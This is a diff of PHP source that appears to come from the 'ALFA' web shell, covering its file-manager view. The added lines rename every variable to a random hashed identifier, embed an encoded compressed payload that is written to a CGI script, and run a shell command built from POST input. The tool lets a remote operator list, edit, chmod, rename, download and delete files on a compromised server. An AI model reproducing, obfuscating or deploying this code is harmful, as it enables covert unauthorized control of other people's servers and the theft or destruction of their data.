+			$ozurlglxd574d4bb40c84861791a694a999cce69 = "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
+			$haiclsffee9a367452a770ec5b0860f6a0e4ebe6 = alfaWriteTocgiapi("getdir.alfa",$ozurlglxd574d4bb40c84861791a694a999cce69);
 			__alfa_set_cookie("alfachdir_bash", "true");
-			__alfa_set_cookie("alfachdir_bash_path", $tmp_getdir_path);
+			__alfa_set_cookie("alfachdir_bash_path", $haiclsffee9a367452a770ec5b0860f6a0e4ebe6);
 		}
-		$dirContent = alfaEx("cd ".$tmp_getdir_path."/alfacgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
-		$dirContent = json_decode($dirContent, true);
-		if(is_array($dirContent)){
-			array_pop($dirContent);
-			$cmd_dir = true;
+		$ynxombge846b365452129ca6fc37251d7cc56b2d = alfaEx("cd ".$haiclsffee9a367452a770ec5b0860f6a0e4ebe6."/alfacgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
+		$ynxombge846b365452129ca6fc37251d7cc56b2d = json_decode($ynxombge846b365452129ca6fc37251d7cc56b2d, true);
+		if(is_array($ynxombge846b365452129ca6fc37251d7cc56b2d)){
+			array_pop($ynxombge846b365452129ca6fc37251d7cc56b2d);
+			$dninrxalb3c2a4e4e995e2bb566ea05a15ae7efb = true;
 		}else{
-			$dirContent = false;
+			$ynxombge846b365452129ca6fc37251d7cc56b2d = false;
 		}
 	}
 }
 alfahead();
 AlfaNum(8,9,10,7,6,5,4);
-$count_dirContent = @count($dirContent);
-if($count_dirContent > 300){
+$kzsohgsx96f38927089025fcb666749c4ed3e17e = @count($ynxombge846b365452129ca6fc37251d7cc56b2d);
+if($kzsohgsx96f38927089025fcb666749c4ed3e17e > 300){
 	@$_COOKIE["alfa_limited_files"] = 100;
 }
-$alfa_sort_by = isset($_COOKIE["alfa_sort_by"]) ? $_COOKIE["alfa_sort_by"] : 'name';
-$alfa_limited_files = isset($_COOKIE["alfa_limited_files"]) ? (int)$_COOKIE["alfa_limited_files"] : 0;
-$alfa_files_page_number = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 1;
-$alfa_filesman_direction = isset($_COOKIE["alfa_filesman_direction"]) ? $_COOKIE["alfa_filesman_direction"] : 'asc';
-$files_page_count = 1;
-if($alfa_limited_files > 0){
-	$files_page_count = ceil($count_dirContent/$alfa_limited_files);
-	if($files_page_count > 1){
-		$files_page_count++;
+$qbrcjtzpaba9d9c6e7530725b536d7fac6802f42 = isset($_COOKIE["alfa_sort_by"]) ? $_COOKIE["alfa_sort_by"] : 'name';
+$fhkqimnk979c39a7da56e11aec8d019f1141f3bf = isset($_COOKIE["alfa_limited_files"]) ? (int)$_COOKIE["alfa_limited_files"] : 0;
+$nbtopthif15df019c7cdad335361676ccccdd613 = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 1;
+$qstyvvzn3d0b9980dfe3d47546d26a3c3da72a13 = isset($_COOKIE["alfa_filesman_direction"]) ? $_COOKIE["alfa_filesman_direction"] : 'asc';
+$pdkblcta21e255669741286e16ca36a2c67482f6 = 1;
+if($fhkqimnk979c39a7da56e11aec8d019f1141f3bf > 0){
+	$pdkblcta21e255669741286e16ca36a2c67482f6 = ceil($kzsohgsx96f38927089025fcb666749c4ed3e17e/$fhkqimnk979c39a7da56e11aec8d019f1141f3bf);
+	if($pdkblcta21e255669741286e16ca36a2c67482f6 > 1){
+		$pdkblcta21e255669741286e16ca36a2c67482f6++;
 	}
 }
-echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#25ff00;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'alfa_sort_by\');" style="color:#25ff00;"><option value="name" '.($alfa_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($alfa_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($alfa_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'alfa_filesman_direction\')" style="color:#25ff00;"><option value="asc" '.($alfa_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($alfa_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#25ff00;" type="text" name="limited_number" value="'.$alfa_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'alfa_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#25ff00;">'.($count_dirContent-1).'</b></span></div><div class="header">';
-if($dirContent == false){
+echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#25ff00;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'alfa_sort_by\');" style="color:#25ff00;"><option value="name" '.($qbrcjtzpaba9d9c6e7530725b536d7fac6802f42 == 'name'?'selected':'').'>Name</option><option value="size" '.($qbrcjtzpaba9d9c6e7530725b536d7fac6802f42 == 'size'?'selected':'').'>Size</option><option value="modify" '.($qbrcjtzpaba9d9c6e7530725b536d7fac6802f42 == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'alfa_filesman_direction\')" style="color:#25ff00;"><option value="asc" '.($qstyvvzn3d0b9980dfe3d47546d26a3c3da72a13 == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($qstyvvzn3d0b9980dfe3d47546d26a3c3da72a13 == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#25ff00;" type="text" name="limited_number" value="'.$fhkqimnk979c39a7da56e11aec8d019f1141f3bf.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'alfa_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#25ff00;">'.($kzsohgsx96f38927089025fcb666749c4ed3e17e-1).'</b></span></div><div class="header">';
+if($ynxombge846b365452129ca6fc37251d7cc56b2d == false){
 echo '<center><br><span style="font-size:16px;"><span style="color: red; -webkit-text-shadow: 1px 1px 13px;"><strong><b><big>!!! Access Denied !!!</b></big><br><br></strong></div>';
 alfaFooter();
 return;
 }
-global $sort;
-$sort = array('name', 1);
+global $xjfdlfkwcadc8c8db42409733582cb3e2298ef87;
+$xjfdlfkwcadc8c8db42409733582cb3e2298ef87 = array('name', 1);
 if(isset($_COOKIE["alfa_sort_by"]) && !empty($_COOKIE["alfa_sort_by"])){
-	$sort[0] = $_COOKIE["alfa_sort_by"];
+	$xjfdlfkwcadc8c8db42409733582cb3e2298ef87[0] = $_COOKIE["alfa_sort_by"];
 }
 if(!empty($_POST['alfa1'])) {
-if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['alfa1'], $match))
-$sort = array($match[1], (int)$match[2]);
+if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['alfa1'], $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc))
+$xjfdlfkwcadc8c8db42409733582cb3e2298ef87 = array($ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[1], (int)$ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[2]);
 }
-if($alfa_files_page_number > ($files_page_count-1)){
-	$alfa_files_page_number = 1;
+if($nbtopthif15df019c7cdad335361676ccccdd613 > ($pdkblcta21e255669741286e16ca36a2c67482f6-1)){
+	$nbtopthif15df019c7cdad335361676ccccdd613 = 1;
 }
-$checkbox_rand = rand(11111, 99999);
-echo "<form onsubmit='fc(this);return false;' name='files' method='post'><table id='filemanager_table' width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk".$checkbox_rand."' onclick='checkBox(this);' class='chkbx'><label for='mchk".$checkbox_rand."'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
-$dirs = $files = array();
-$n = $count_dirContent;
-if($n > $alfa_limited_files && $alfa_limited_files > 0){
-	$n = ($alfa_limited_files * $alfa_files_page_number);
-	if($n > $count_dirContent){
-		$n = $count_dirContent;
+$zqrvucqbd9455bc0782dc076b8679b65c56539b8 = rand(11111, 99999);
+echo "<form onsubmit='fc(this);return false;' name='files' method='post'><table id='filemanager_table' width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk".$zqrvucqbd9455bc0782dc076b8679b65c56539b8."' onclick='checkBox(this);' class='chkbx'><label for='mchk".$zqrvucqbd9455bc0782dc076b8679b65c56539b8."'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
+$rgfoludk33030abc929f083da5f6c3f755b46034 = $blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 = array();
+$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 = $kzsohgsx96f38927089025fcb666749c4ed3e17e;
+if($qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 > $fhkqimnk979c39a7da56e11aec8d019f1141f3bf && $fhkqimnk979c39a7da56e11aec8d019f1141f3bf > 0){
+	$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 = ($fhkqimnk979c39a7da56e11aec8d019f1141f3bf * $nbtopthif15df019c7cdad335361676ccccdd613);
+	if($qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 > $kzsohgsx96f38927089025fcb666749c4ed3e17e){
+		$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 = $kzsohgsx96f38927089025fcb666749c4ed3e17e;
 	}
 }
-$i = 0;
-if($alfa_limited_files > 0 && $alfa_files_page_number > 1){
-	$i = $alfa_limited_files * ($alfa_files_page_number - 1);
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 0;
+if($fhkqimnk979c39a7da56e11aec8d019f1141f3bf > 0 && $nbtopthif15df019c7cdad335361676ccccdd613 > 1){
+	$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = $fhkqimnk979c39a7da56e11aec8d019f1141f3bf * ($nbtopthif15df019c7cdad335361676ccccdd613 - 1);
 }
-$page_builder = get_pagination_links($alfa_files_page_number,$files_page_count -1);
-$cmd_dir_backp = "";
-for(;$i<$n;$i++){
-if($cmd_dir){
-$filename = $dirContent[$i]["name"];
-$file_owner = $dirContent[$i]["owner"];
-$file_group = $dirContent[$i]["group"];
-$file_modify = @date('Y-m-d H:i:s', $dirContent[$i]["modify"]);
-$file_perm = alfaPermsColor(array("class"=>$dirContent[$i]["permcolor"],"num"=>$dirContent[$i]["permnum"],"human"=>$dirContent[$i]["permhuman"]),true);
-$file_size = $dirContent[$i]["size"];
-if(substr($dirContent[$i]["name"], 0 ,1) == "/"){
-$file_path = $dirContent[$i]["name"];
-$dirContent[$i]["name"] = "..";
-$filename = $dirContent[$i]["name"];
+$nfqanqtl9020897dcdf7d2351efb0dcd6928eeb2 = get_pagination_links($nbtopthif15df019c7cdad335361676ccccdd613,$pdkblcta21e255669741286e16ca36a2c67482f6 -1);
+$kmgfttva96b8f562e3bd588b4bf8f33ece06bb5a = "";
+for(;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
+if($dninrxalb3c2a4e4e995e2bb566ea05a15ae7efb){
+$ydojshxa435ed7e9f07f740abf511a62c00eef6e = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"];
+$dkaogabh4ec4bcc7102266cf3de98ec5693b356a = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["owner"];
+$rpagoyoaffa309cd16f9906446e409e8e1fca46c = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["group"];
+$kaetjeum0accdd691149b8182212528c8ed7330c = @date('Y-m-d H:i:s', $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["modify"]);
+$jldneloy4ac335b84cbc6e1bce3868e38065f567 = alfaPermsColor(array("class"=>$ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["permcolor"],"num"=>$ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["permnum"],"human"=>$ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["permhuman"]),true);
+$noybsmul234ef73792399c22704f8aef10b14541 = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["size"];
+if(substr($ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"], 0 ,1) == "/"){
+$dvqnfoff97fd815a3803a0588876bdd862014fed = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"];
+$ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"] = "..";
+$ydojshxa435ed7e9f07f740abf511a62c00eef6e = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"];
 }else{
-$file_path = $GLOBALS['cwd']."/".$dirContent[$i]["name"];
+$dvqnfoff97fd815a3803a0588876bdd862014fed = $GLOBALS['cwd']."/".$ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"];
 }
 }else{
-$filename = $dirContent[$i];
-$ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($GLOBALS['cwd'].$filename)):array("name" => "????");
-$gr = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($GLOBALS['cwd'].$filename)):array("name" => "????");
-$file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($GLOBALS['cwd'].$filename):"????");
-$file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($GLOBALS['cwd'].$filename):"????");
-$file_modify = @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $filename));
-$file_perm = alfaPermsColor($GLOBALS['cwd'].$filename);
-$file_size = @filesize($GLOBALS['cwd'].$filename);
-$file_path = $GLOBALS['cwd'].$filename;
+$ydojshxa435ed7e9f07f740abf511a62c00eef6e = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741];
+$eajtptdv617a4046ef07a0d9851942247a994cf9 = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e)):array("name" => "????");
+$ylzdpqhrd692bc40d83423d24d3a37582f58468c = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e)):array("name" => "????");
+$dkaogabh4ec4bcc7102266cf3de98ec5693b356a = $eajtptdv617a4046ef07a0d9851942247a994cf9['name']?$eajtptdv617a4046ef07a0d9851942247a994cf9['name']:(function_exists("fileowner")?@fileowner($GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e):"????");
+$rpagoyoaffa309cd16f9906446e409e8e1fca46c = $ylzdpqhrd692bc40d83423d24d3a37582f58468c['name']?$ylzdpqhrd692bc40d83423d24d3a37582f58468c['name']:(function_exists("filegroup")?@filegroup($GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e):"????");
+$kaetjeum0accdd691149b8182212528c8ed7330c = @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $ydojshxa435ed7e9f07f740abf511a62c00eef6e));
+$jldneloy4ac335b84cbc6e1bce3868e38065f567 = alfaPermsColor($GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e);
+$noybsmul234ef73792399c22704f8aef10b14541 = @filesize($GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e);
+$dvqnfoff97fd815a3803a0588876bdd862014fed = $GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e;
 }
-$tmp = array('name' => $filename,
-'path' => $file_path,
-'modify' => $file_modify,
-'perms' => $file_perm,
-'size' => $file_size,
-'owner' => $file_owner,
-'group' => $file_group
+$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = array('name' => $ydojshxa435ed7e9f07f740abf511a62c00eef6e,
+'path' => $dvqnfoff97fd815a3803a0588876bdd862014fed,
+'modify' => $kaetjeum0accdd691149b8182212528c8ed7330c,
+'perms' => $jldneloy4ac335b84cbc6e1bce3868e38065f567,
+'size' => $noybsmul234ef73792399c22704f8aef10b14541,
+'owner' => $dkaogabh4ec4bcc7102266cf3de98ec5693b356a,
+'group' => $rpagoyoaffa309cd16f9906446e409e8e1fca46c
 );
-if($filename == ".." && !$cmd_dir){
-	$tmp["path"] = str_replace("\\", "/", realpath($file_path));
+if($ydojshxa435ed7e9f07f740abf511a62c00eef6e == ".." && !$dninrxalb3c2a4e4e995e2bb566ea05a15ae7efb){
+	$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef["path"] = str_replace("\\", "/", realpath($dvqnfoff97fd815a3803a0588876bdd862014fed));
 }
-if(!$cmd_dir){
-if(@is_file($file_path)){
-$arr_mrg = array('type' => 'file');
-if(@is_link($file_path)){
-$arr_mrg["link"] = readlink($tmp['path']);
+if(!$dninrxalb3c2a4e4e995e2bb566ea05a15ae7efb){
+if(@is_file($dvqnfoff97fd815a3803a0588876bdd862014fed)){
+$cixmnxai6a989612dc00b5bbe81a5f0892e411f0 = array('type' => 'file');
+if(@is_link($dvqnfoff97fd815a3803a0588876bdd862014fed)){
+$cixmnxai6a989612dc00b5bbe81a5f0892e411f0["link"] = readlink($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef['path']);
 }
-$files[] = array_merge($tmp, $arr_mrg);
-}elseif(@is_link($file_path)){
-$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
-}elseif(@is_dir($file_path)&& ($filename != ".")){
-$dirs[] = array_merge($tmp, array('type' => 'dir'));
+$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1[] = array_merge($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef, $cixmnxai6a989612dc00b5bbe81a5f0892e411f0);
+}elseif(@is_link($dvqnfoff97fd815a3803a0588876bdd862014fed)){
+$rgfoludk33030abc929f083da5f6c3f755b46034[] = array_merge($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef, array('type' => 'link', 'link' => readlink($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef['path'])));
+}elseif(@is_dir($dvqnfoff97fd815a3803a0588876bdd862014fed)&& ($ydojshxa435ed7e9f07f740abf511a62c00eef6e != ".")){
+$rgfoludk33030abc929f083da5f6c3f755b46034[] = array_merge($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef, array('type' => 'dir'));
 }
 }else{
-	if($dirContent[$i]["type"]=="file"){
-		$files[] = array_merge($tmp, array('type' => 'file'));
+	if($ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["type"]=="file"){
+		$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1[] = array_merge($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef, array('type' => 'file'));
 	}else{
-		if($dirContent[$i]["name"] != "."){
-			$dirs[] = array_merge($tmp, array('type' => 'dir'));
+		if($ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"] != "."){
+			$rgfoludk33030abc929f083da5f6c3f755b46034[] = array_merge($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef, array('type' => 'dir'));
 		}
 	}
 }
 }
-$GLOBALS['sort'] = $sort;
-function alfaCmp($a, $b) {
+$GLOBALS['sort'] = $xjfdlfkwcadc8c8db42409733582cb3e2298ef87;
+function alfaCmp($gtvtgpki0cc175b9c0f1b6a831c399e269772661, $aospafqz92eb5ffee6ae2fec3ad71c777531578f) {
 if($GLOBALS['sort'][0] != 'size')
-return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
+return strcmp(strtolower($gtvtgpki0cc175b9c0f1b6a831c399e269772661[$GLOBALS['sort'][0]]), strtolower($aospafqz92eb5ffee6ae2fec3ad71c777531578f[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
 else
-return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
+return (($gtvtgpki0cc175b9c0f1b6a831c399e269772661['size'] < $aospafqz92eb5ffee6ae2fec3ad71c777531578f['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
 }
-usort($files, "alfaCmp");
-usort($dirs, "alfaCmp");
+usort($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1, "alfaCmp");
+usort($rgfoludk33030abc929f083da5f6c3f755b46034, "alfaCmp");
 if(isset($_COOKIE["alfa_filesman_direction"])&& !empty($_COOKIE["alfa_filesman_direction"])){
 	if($_COOKIE["alfa_filesman_direction"] == 'desc'){
-		$files = array_reverse($files);
-		$dirs = array_reverse($dirs);
+		$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 = array_reverse($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1);
+		$rgfoludk33030abc929f083da5f6c3f755b46034 = array_reverse($rgfoludk33030abc929f083da5f6c3f755b46034);
 	}
 }
-$files = array_merge($dirs, $files);
-$l=0;
-$cc=0;
-foreach($files as $f){
-$f['name'] = htmlspecialchars($f['name']);
-$newname = mb_strlen($f['name'], 'UTF-8')>60?mb_substr($f['name'], 0, 60, 'utf-8').'...':$f['name'];
-$checkbox = 'checkbox_'.$checkbox_rand.$cc;
-$raw_name = rawurlencode($f['name']);
-$icon = $GLOBALS['DB_NAME']['show_icons']?'<img src="'.findicon($f['name'],$f['type']).'" width="30" height="30">':'';
-$style = $GLOBALS['DB_NAME']['show_icons']?'position:relative;display:inline-block;bottom:12px;':'';
-echo '<tr class="fmanager-row" id="tr_row_'.$cc.'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'.$raw_name.'" class="chkbx" id="'.$checkbox .'"><label for="'.$checkbox .'"></label></div></td><td id="td_row_'.$cc.'">'.$icon.'<div style="'.$style.'"><a row="'.$cc.'" id="id_'.$cc.'" class="main_name" onclick="'.(($f['type']=='file')?'editor(\''.$raw_name.'\',\'auto\',\'\',\'\',\'\',\''.$f['type'].'\');" href="#action=fileman&path='.$GLOBALS['cwd'].'&file='.$raw_name.'" fname="'.$raw_name.'" ftype="file" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'>'.($GLOBALS['cwd'].$f['name']==$GLOBALS['__file_path']?"<span class='shell_name' style='font-weight:unset;'>".$f['name']."</span>":htmlspecialchars($newname)):'g(\'FilesMan\',\''.$f['path'].'\');" href="#action=fileman&path='.$f['path'].'" fname="'.$raw_name.'" ftype="folder" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'><b>| ' . htmlspecialchars($f['name']) . ' |</b>').'</a></td></div><td><span style="font-weight:unset;" class="main_size">'.(($f['type']=='file')?(isset($f['link'])?'[L] ':'').alfaSize($f['size']):$f['type']).'</span></td><td><span style="font-weight:unset;" class="main_modify">'.$f['modify'].'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'.$f['owner'].'/'.$f['group'].'</span></td><td><a id="id_chmode_'.$cc.'" href=javascript:void(0) onclick="editor(\''.$raw_name.'\',\'chmod\',\'\',\'\',\'\',\''.$f['type'].'\')">'.
-$f['perms'].'</td><td><a id="id_rename_'.$cc.'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'rename\',\'\',\'\',\'\',\''.$f['type'].'\')">R</a> <a id="id_touch_'.$cc.'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'touch\',\'\',\'\',\'\',\''.$f['type'].'\')">T</a>'.(($f['type']=='file')?' <a id="id_edit_'.$cc.'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'edit\',\'\',\'\',\'\',\''.$f['type'].'\')">E</a> <a id="id_download_'.$cc.'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$raw_name.'\', \'download\')">D</a>':'').'<a id="id_delete_'.$cc.'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '.addslashes(rawurldecode($f['name'])).' # ?\'); chk ? g(\'FilesMan\',null,\'delete\', \''.$raw_name.'\') : \'\';"> X </a></td></tr>';
-$l = $l?0:1;
-$cc++;
+$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 = array_merge($rgfoludk33030abc929f083da5f6c3f755b46034, $blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1);
+$rieuszxn2db95e8e1a9267b7a1188556b2013b33=0;
+$omusmjtke0323a9039add2978bf5b49550572c7c=0;
+foreach($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 as $npviloqa8fa14cdd754f91cc6554c9e71929cce7){
+$npviloqa8fa14cdd754f91cc6554c9e71929cce7['name'] = htmlspecialchars($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name']);
+$xnetwpjf96704c6e6d422933503bdc9586e164bf = mb_strlen($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name'], 'UTF-8')>60?mb_substr($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name'], 0, 60, 'utf-8').'...':$npviloqa8fa14cdd754f91cc6554c9e71929cce7['name'];
+$kayboipx9fced129522f128b2445a41fb0b6ef9f = 'checkbox_'.$zqrvucqbd9455bc0782dc076b8679b65c56539b8.$omusmjtke0323a9039add2978bf5b49550572c7c;
+$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab = rawurlencode($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name']);
+$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a = $GLOBALS['DB_NAME']['show_icons']?'<img src="'.findicon($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name'],$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type']).'" width="30" height="30">':'';
+$tpqopcpra1b01e734b573fca08eb1a65e6df9a38 = $GLOBALS['DB_NAME']['show_icons']?'position:relative;display:inline-block;bottom:12px;':'';
